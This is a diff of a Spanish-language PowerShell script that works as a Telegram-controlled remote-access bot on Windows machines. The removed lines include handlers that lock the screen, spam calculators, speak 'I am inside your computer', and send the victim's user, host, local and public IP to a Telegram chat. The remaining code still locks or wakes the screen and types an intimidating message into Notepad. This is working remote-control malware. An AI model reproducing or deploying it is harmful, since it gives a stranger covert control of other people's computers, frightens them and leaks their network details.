@@ -108,95 +108,6 @@ while ($true) {
                 if ($IDDestino -eq $MiIDNum -and $IDDestino -ne "") {
                     
                     switch ($Comando) {
-                                        
-                        "/ayuda" {
-                            $TextoAyuda = "MANUAL DE COMANDOS`n`n" +
-                                          "• /lista o /ayuda - Comandos globales.`n" +
-                                          "• /ip [ID] - Ver datos de red.`n" +
-                                          "• /reloj [ID] - Cuenta regresiva flotante.`n" +
-                                          "• /notepad [ID] - Abre bloc de notas.`n" +
-                                          "• /subir_vol [ID] - Sube el audio.`n" +
-                                          "• /silenciar [ID] - Mutea el sonido.`n" +
-                                          "• /escritorio [ID] - Minimiza todo.`n" +
-                                          "• /luces [ID] - Destella luz de CapsLock.`n" +
-                                          "• /youtube [ID] - Abre YouTube.`n" +
-                                          "• /hablar [ID] - Reproduce voz remota.`n" +
-                                          "• /pitido [ID] - Ejecuta alertas Beep.`n" +
-                                          "• /calculadora [ID] - Abre calculadora.`n" +
-                                          "• /pantalla_off [ID] - Bloquea equipo.`n" +
-                                          "• /pantalla_on [ID] - Despierta pantalla."
-                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $TextoAyuda })
-                        }
-                        "/reloj" {
-                            $wsh = New-Object -ComObject WScript.Shell
-                            # Al usar un bucle asincrono, no se traba el bot de Telegram
-                            $ScriptReloj = [scriptblock]{
-                                $w = New-Object -ComObject WScript.Shell
-                                for ($i = 60; $i -gt 0; $i--) {
-                                    $w.Popup("Faltan " + $i + " segundos para desbloquear la pantalla.", 1, "Cuenta Regresiva", 0 + 48 + 4096)
-                                }
-                            }
-                            $Null = Start-Job -ScriptBlock $ScriptReloj
-                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Cuenta regresiva flotante iniciada en ID " + $MiIDNum })
-                        }
-                        "/notepad" {
-                            notepad.exe
-                            Start-Sleep -Milliseconds 500
-                            $wsh = New-Object -ComObject WScript.Shell
-                            $wsh.SendKeys("Te estoy observando por Internet...")
-                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Bloc de notas abierto en ID " + $MiIDNum })
-                        }
-                        "/subir_vol" {
-                            $wsh = New-Object -ComObject WScript.Shell
-                            for ($i = 0; $i -lt 50; $i++) { $wsh.SendKeys([char]175) }
-                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Volumen al maximo en ID " + $MiIDNum })
-                        }
-                        "/silenciar" {
-                            $wsh = New-Object -ComObject WScript.Shell
-                            $wsh.SendKeys([char]173)
-                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Audio silenciado/activado en ID " + $MiIDNum })
-                        }
-                        "/escritorio" {
-                            $wsh = New-Object -ComObject WScript.Shell
-                            $wsh.SendKeys("#d") # Atajo Windows + D
-                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Escritorio mostrado en ID " + $MiIDNum })
-                        }
-                        "/luces" {
-                            $wsh = New-Object -ComObject WScript.Shell
-                            for ($i = 0; $i -lt 10; $i++) {
-                                $wsh.SendKeys("{CAPSLOCK}")
-                                Start-Sleep -Milliseconds 200
-                            }
-                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Prueba de luces completada en ID " + $MiIDNum })
-                        }
-                        "/youtube" {
-                            Start-Process "https://youtube.com"
-                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Navegador abierto en YouTube en ID " + $MiIDNum })
-                        }
-                        "/hablar" {
-                            try {
-                                Add-Type -AssemblyName System.Speech
-                                $synthesizer = New-Object System.Speech.Synthesis.SpeechSynthesizer
-                                $synthesizer.Speak("Hola. Estoy dentro de tu computadora.")
-                                [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Sintetizador de voz ejecutado en ID " + $MiIDNum })
-                            } catch {
-                                [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "El equipo ID " + $MiIDNum + " no soporta voz nativa" })
-                            }
-                        }
-                        "/pitido" {
-                            for ($i = 0; $i -lt 5; $i++) {
-                                [console]::Beep(1500, 400)
-                                Start-Sleep -Milliseconds 200
-                            }
-                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Alertas sonoras Beep enviadas a ID " + $MiIDNum })
-                        }
-                        "/calculadora" {
-                            for ($i = 0; $i -lt 5; $i++) {
-                                Start-Process calc.exe
-                                Start-Sleep -Milliseconds 300
-                            }
-                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Calculadoras abiertas en ID " + $MiIDNum })
-                        }
                         "/pantalla_off" {
                             $rundll = New-Object -ComObject WScript.Shell
                             $rundll.Run("rundll32.exe user32.dll,LockWorkStation")
@@ -208,14 +119,23 @@ while ($true) {
                             $wsh.SendKeys("{SHIFT}")
                             [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Pantalla encendida en ID " + $MiIDNum })
                         }
-                        "/ip" {
-                            $IPLocal = (Get-NetIPAddress -InterfaceAddressFamily IPv4 | Where-Object { $_.IPAddress -notlike "127*" -and $_.IPAddress -notlike "169*" }).IPAddress -join ", "
-                            if ($null -eq $IPLocal -or $IPLocal -eq "") { $IPLocal = "No detectada" }
-                            $IPPublica = "Desconectado"
-                            try { $IPPublica = (Invoke-RestMethod -Uri "https://ipify.org" -TimeoutSec 5).Trim() } catch {
-                                try { $IPPublica = (Invoke-RestMethod -Uri "https://ifconfig.me" -TimeoutSec 5).Trim() } catch {}
-                            }
-                            $ReporteIP = "DATOS DE RED DE LA PC`n`nID Numerico: [" + $MiIDNum + "]`nEquipo: " + $User + "@" + $MiPC + "`n`n• IP Local (Red): " + $IPLocal + "`n• IP Publica (Internet): " + $IPPublica
-                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = $ReporteIP })
+                        "/notepad" {
+                            notepad.exe
+                            Start-Sleep -Milliseconds 500
+                            $wsh = New-Object -ComObject WScript.Shell
+                            $wsh.SendKeys("Te estoy observando por Internet... 👀")
+                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Bloc de notas abierto en ID " + $MiIDNum })
                         }
                     }
+                }
+            }
+        }
+    } catch {
+        Start-Sleep -Seconds 3
+    }
+    Start-Sleep -Seconds 2
+}
+
+
+
+                
